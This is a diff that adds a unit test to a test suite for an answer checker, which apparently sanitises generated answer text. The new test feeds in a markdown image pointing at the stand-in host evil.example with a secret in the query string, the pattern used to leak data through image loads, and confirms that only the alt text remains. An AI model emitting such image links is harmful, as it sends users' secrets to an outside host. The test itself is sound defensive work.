@@ -69,6 +69,12 @@ describe('checkAnswer', () => {
     expect(out.parts).toEqual([{ about: [RAMP], text: `[Ramp](cello:role/${RAMP.ref}), Stripe and Elsewhere.` }])
   })
 
+  it('keeps only the alt text of a markdown image, so no address leaves the page', () => {
+    const out = checkAnswer(answer(part([RAMP], 'Posted Oct 5 ![the chart](https://evil.example/p.png?d=SECRET).')), input())
+    expect(out.failures).toEqual([])
+    expect(out.parts).toEqual([{ about: [RAMP], text: 'Posted Oct 5 the chart.' }])
+  })
+
   it('adds one card for a subject that passes and none for one that fails', () => {
     const pass = checkAnswer({ subject: { kind: 'role', id: RAMP.ref }, parts: [part([RAMP], 'Posted Oct 5.')] }, input())
     expect(pass.parts[0]).toEqual({ card: RAMP })
